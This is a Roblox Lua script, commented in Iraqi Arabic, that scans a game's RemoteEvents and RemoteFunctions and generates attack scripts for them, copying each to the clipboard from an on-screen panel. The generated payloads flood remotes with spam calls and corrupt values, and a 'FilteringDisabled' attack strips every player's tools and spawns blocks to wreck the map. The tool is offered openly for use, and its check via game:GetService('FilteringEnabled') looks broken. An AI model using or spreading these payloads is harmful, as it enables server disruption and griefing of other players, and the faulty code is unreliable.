# Kope999--.
هاذا سكربت يكشف ثغرات استخدمه بحكمه لانه بكشف صدق
-- تحيات مطور Kope999lol لكم
-- ملاحضه مهمه : لو ما كشف ثغرات ماب بيه حمايه قويه
-- سكربت عام علمود لو تردون تعدلون عليه 
-- اتمنى الكم تجربه حلوة 😍
-- سكربت كشف ثغرات ملاحضه استخدمه بحكمه لان هاذ يكشف ثغرات صدك !!

local SmartExploitConverter = {
    FoundExploits = {},
    GeneratedScripts = {}
}

-- 1. سيتم اكتشاف و تحويل ثغره ل سكربت!🙏
function SmartExploitConverter:ScanAndConvert()
    local exploits = {}
    
    -- البحث عن RemoteEvent ليتم تحويله!
    for _, remote in pairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            local exploitScript = self:RemoteToExploit(remote)
            exploits[#exploits + 1] = {
                name = remote.Name,
                path = remote:GetFullName(),
                type = "RemoteEvent",
                threat = self:GetThreatLevel(remote),
                exploitScript = exploitScript
            }
        end
    end
    
    -- البحث عن RemoteFunctions ليتم تحويله
    for _, remote in pairs(game:GetDescendants()) do
        if remote:IsA("RemoteFunction") then
            local exploitScript = self:RemoteFunctionToExploit(remote)
            exploits[#exploits + 1] = {
                name = remote.Name,
                path = remote:GetFullName(),
                type = "RemoteFunction",
                threat = self:GetThreatLevel(remote),
                exploitScript = exploitScript
            }
        end
    end
    
    -- جار التحقق من FilteringEnabled لك اصبر
    if not game:GetService("FilteringEnabled") then
        local exploitScript = self:CreateFilteringExploit()
        exploits[#exploits + 1] = {
            name = "FilteringDisabled",
            path = "Game",
            type = "ServerAccess",
            threat = "Critical",
            exploitScript = exploitScript
        }
    end
    
    self.FoundExploits = exploits
    return exploits
end

-- تحديد مستوى الخطورة
function SmartExploitConverter:GetThreatLevel(obj)
    local name = obj.Name:lower()
    local path = obj:GetFullName():lower()
    
    if name:find("admin") or name:find("money") or name:find("cash") 
       or path:find("admin") or path:find("money") or path:find("cash") then
        return "High"
    elseif name:find("data") or name:find("save") or name:find("store") then
        return "Medium"
    else
        return "Low"
    end
end

-- سيتم الحصول علا لون خطوره ! ديربالك تلعب بيه هاذ😍
function SmartExploitConverter:GetThreatColor(threat)
    if threat == "Critical" then
        return Color3.fromRGB(255, 50, 50)
    elseif threat == "High" then
        return Color3.fromRGB(255, 120, 0)
    elseif threat == "Medium" then
        return Color3.fromRGB(255, 200, 0)
    else
        return Color3.fromRGB(100, 200, 100)
    end
end

-- 2. يتم تحويل RemoteEvent اله سكربت استغلال اصبر😍🙏
function SmartExploitConverter:RemoteToExploit(remote)
    local scriptTemplate = [[
-- استغلال تلقائي لـ: ]] .. remote:GetFullName() .. [[

local targetRemote = ]] .. self:GetPathString(remote) .. [[

-- كاعد اسوي هجوم Flood🥀
for i = 1, 100 do
    spawn(function()
        targetRemote:FireServer("EXPLOIT_ATTACK_" .. i, {
            hacker = "AutoExploitSystem",
            timestamp = os.time(),
            damage = math.random(1, 1000)
        })
    end)
end

-- كاعد ادز ملفات علمود يتم اختراق!
local corruptData = {
    nil,
    true,
    false,
    math.huge,
    -math.huge,
    {},
    function() return "HACKED" end,
    "CORRUPTED_STRING_" .. string.rep("X", 1000)
}

for index, badValue in pairs(corruptData) do
    targetRemote:FireServer("CORRUPT_" .. index, badValue)
end

print("✅ تم استغلال RemoteEvent: ]] .. remote.Name .. [[")
return true
]]
    
    return scriptTemplate
end

-- 3. يتم تحويل RemoteFunction اله استغلال اصبر😹
function SmartExploitConverter:RemoteFunctionToExploit(remoteFunc)
    local scriptTemplate = [[
-- استغلال تلقائي لـ: ]] .. remoteFunc:GetFullName() .. [[

local targetFunction = ]] .. self:GetPathString(remoteFunc) .. [[

-- كاعد اسوي سبام علمود يتعطل
for i = 1, 50 do
    spawn(function()
        local success, result = pcall(function()
            return targetFunction:InvokeServer("HACK_REQUEST_" .. i, {
                exploit = true,
                loop = i,
                data = string.rep("SPAM", 100)
            })
        end)
        
        if success then
            print("Request " .. i .. " returned: ", result)
        end
    end)
end

-- كاعد ادزر طلبات فاسده
local invalidRequests = {
    nil,
    {},
    {nested = {deep = {}}},
    math.huge,
    -math.huge
}

for _, badRequest in pairs(invalidRequests) do
    pcall(function()
        targetFunction:InvokeServer(badRequest)
    end)
end

print("✅ تم استغلال RemoteFunction: ]] .. remoteFunc.Name .. [[")
return true
]]
    
    return scriptTemplate
end

-- 4. هجوم كاعد اسوي FilteringEnabled علمود يتعطل
function SmartExploitConverter:CreateFilteringExploit()
    return [[
-- كاعد احاول اوصل ل FilteringDisabled علمود اسوي استغلال

-- 1. كاعد احاول احذف ادوات من ناس
for _, player in pairs(game.Players:GetPlayers()) do
    if player.Backpack then
        player.Backpack:ClearAllChildren()
    end
    if player.Character then
        for _, tool in pairs(player.Character:GetChildren()) do
            if tool:IsA("Tool") then
                tool:Destroy()
            end
        end
    end
end

-- 2. كاعد اغير خصائص العالم علمود تكدر تسوي تريده هاي تكدر تعدل عليها
workspace.Gravity = 196.2 * 2
game.Lighting.FogEnd = 10
game.Lighting.OutdoorAmbient = Color3.new(1, 0, 0)

-- 3. هاي لو لكيت ثغره قويه لدرجه انه تخرب ماب هاي تسوي بلوكات هاي علمود تخرب ماب
for i = 1, 20 do
    local part = Instance.new("Part")
    part.Size = Vector3.new(10, 10, 10)
    part.Position = Vector3.new(
        math.random(-100, 100),
        math.random(10, 50),
        math.random(-100, 100)
    )
    part.Anchored = true
    part.BrickColor = BrickColor.random()
    part.Parent = workspace
end

print("✅ تم استغلال FilteringDisabled - وصول كامل للسيرفر")
return true
]]
end

-- 5. كاعد احول مسار ل سكربت اصبر ولك
function SmartExploitConverter:GetPathString(obj)
    local path = ""
    local parent = obj
    
    while parent ~= game do
        if path == "" then
            path = parent.Name
        else
            path = parent.Name .. "." .. path
        end
        parent = parent.Parent
    end
    
    return "game." .. path
end

-- 6. هاي تنسخ ثغره ل حافضه
function SmartExploitConverter:CopyToClipboard(text)
    pcall(function()
        setclipboard(text)
    end)
    
    -- هاذ اشعار يكلك تم النسخ
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ لقد تم نسخ شوف حافضه",
        Text = "شوف حافضه لو اجا سكربت بيها",
        Duration = 3
    })
    
    print("\n📋 === السكربت الي نسخته انته ===\n")
    print(text)
    print("\n📋 === تم انتهاء نص !🥀😍 ===\n")
end

-- 7. هاي واجه اكس الي تحذف و الي تخلي سكربت يتحرك
function SmartExploitConverter:ShowResults()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExploitScannerResults"
    gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    -- هاي لا تلعب بيها علمود سكربت يضل يتحرك ب شاشه
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.8, 0, 0.8, 0)
    frame.Position = UDim2.new(0.1, 0, 0.1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true  -- قابل للسحب
    frame.Parent = gui
    
    -- هاذ شريط مال عنوان ويا زر الاغلاق
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 40)
    titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    titleBar.Parent = frame
    
    -- هاي هنا كشف ثغرات
    local title = Instance.new("TextLabel")
    title.Text = "🔍 ماب مليان ثغرات🥀" .. #self.FoundExploits .. " ثغرة"
    title.Size = UDim2.new(1, -50, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar
    
    -- هاي زر اغلاق (علامة X)
    local closeButton = Instance.new("TextButton")
    closeButton.Text = "✕❌"
    closeButton.Size = UDim2.new(0, 40, 1, 0)
    closeButton.Position = UDim2.new(1, -40, 0, 0)
    closeButton.TextColor3 = Color3.fromRGB(255, 100, 100)
    closeButton.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
    closeButton.Font = Enum.Font.GothamBold
    closeButton.TextSize = 20
    closeButton.Parent = titleBar
    
    -- هاي لو تلعب بيها سكربت ما ينغلق اله لو سويت ريستارت او طلعت من ماب
    closeButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)
    
    -- هاي مال تحريك
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -20, 0.85, -50)
    scroll.Position = UDim2.new(0, 10, 0, 50)
    scroll.BackgroundTransparency = 1
    scroll.ScrollBarThickness = 8
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.Parent = frame
    
    local yOffset = 0
    
    for i, exploit in pairs(self.FoundExploits) do
        local threatColor = self:GetThreatColor(exploit.threat)
        
        local exploitFrame = Instance.new("Frame")
        exploitFrame.Size = UDim2.new(1, -10, 0, 110)
        exploitFrame.Position = UDim2.new(0, 5, 0, yOffset)
        exploitFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        exploitFrame.Parent = scroll
        
        -- هاذ اطار خطورخ يعني يطلعلك خطورت ثغره
        local threatFrame = Instance.new("Frame")
        threatFrame.Size = UDim2.new(0.2, 0, 1, 0)
        threatFrame.BackgroundColor3 = threatColor
        threatFrame.BackgroundTransparency = 0.3
        threatFrame.Parent = exploitFrame
        
        -- هاذ يسوي مستوى خطورة
        local threatLabel = Instance.new("TextLabel")
        threatLabel.Text = exploit.threat
        threatLabel.Size = UDim2.new(1, 0, 1, 0)
        threatLabel.TextColor3 = threatColor
        threatLabel.BackgroundTransparency = 1
        threatLabel.Font = Enum.Font.GothamBold
        threatLabel.TextSize = 14
        threatLabel.Parent = threatFrame
        
        -- هاذ اسم ثغره
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Text = i .. ". " .. exploit.name .. " (" .. exploit.type .. ")"
        nameLabel.Size = UDim2.new(0.7, -10, 0, 30)
        nameLabel.Position = UDim2.new(0.22, 0, 0, 5)
        nameLabel.TextColor3 = Color3.new(1, 1, 1)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Font = Enum.Font.GothamBold
        nameLabel.TextSize = 14
        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
        nameLabel.Parent = exploitFrame
        
        -- هاذ المسار
        local pathLabel = Instance.new("TextLabel")
        pathLabel.Text = "📍 " .. exploit.path
        pathLabel.Size = UDim2.new(0.7, -10, 0, 20)
        pathLabel.Position = UDim2.new(0.22, 0, 0, 35)
        pathLabel.TextColor3 = Color3.fromRGB(180, 180, 220)
        pathLabel.BackgroundTransparency = 1
        pathLabel.Font = Enum.Font.Gotham
        pathLabel.TextSize = 11
        pathLabel.TextXAlignment = Enum.TextXAlignment.Left
        pathLabel.TextTruncate = Enum.TextTruncate.AtEnd
        pathLabel.Parent = exploitFrame
        
        -- هاذ المكان الي ينسخ ثغره يحولها سكربت
        local copyButton = Instance.new("TextButton")
        copyButton.Text = "📋 نسخ ثغره - نسخ السكربت"
        copyButton.Size = UDim2.new(0.7, -10, 0, 30)
        copyButton.Position = UDim2.new(0.22, 0, 0, 70)
        copyButton.TextColor3 = Color3.new(1, 1, 1)
        copyButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
        copyButton.Font = Enum.Font.GothamBold
        copyButton.TextSize = 12
        copyButton.Parent = exploitFrame
        
        -- هاي لو لعبت بيها بعد ما ينسخ ثغره
        copyButton.MouseButton1Click:Connect(function()
            self:CopyToClipboard(exploit.exploitScript)
        end)
        
        yOffset = yOffset + 120
    end
    
    scroll.CanvasSize = UDim2.new(0, 0, 0, yOffset)
    
    -- هاي اذا ما لكيت ثغرات معناها ماب بيه حمايه كلش قويه
    if #self.FoundExploits == 0 then
        local noResults = Instance.new("TextLabel")
        noResults.Text = "⚠️ لم يتم العثور على ثغرات\n\nالأسباب المحتملة:\n• الماب محمي جداً\n• FilteringEnabled مفعل\n• لا توجد Remotes مكشوفة"
        noResults.Size = UDim2.new(1, -40, 0, 150)
        noResults.Position = UDim2.new(0, 20, 0.3, 0)
        noResults.TextColor3 = Color3.fromRGB(255, 200, 0)
        noResults.BackgroundTransparency = 1
        noResults.Font = Enum.Font.GothamBold
        noResults.TextSize = 16
        noResults.TextWrapped = true
        noResults.Parent = frame
    end
end

-- 8. تشغيل تلقائي هنا🥀
function SmartExploitConverter:RunFullScan()
    print("🔍 بدء المسح عن الثغرات...")
    self:ScanAndConvert()
    print("✅ تم اكتشاف " .. #self.FoundExploits .. " ثغرة")
    self:ShowResults()
    print("📋 اضغط على 'نسخ السكربت' لنسخ سكربت الاستغلال")
    print("✕ اضغط '✕' لإغلاق النافذة")
    print("↔️ اسحب النافذة لتحريكها")
end

-- التشغيل تلقائي تم🙏
SmartExploitConverter:RunFullScan()
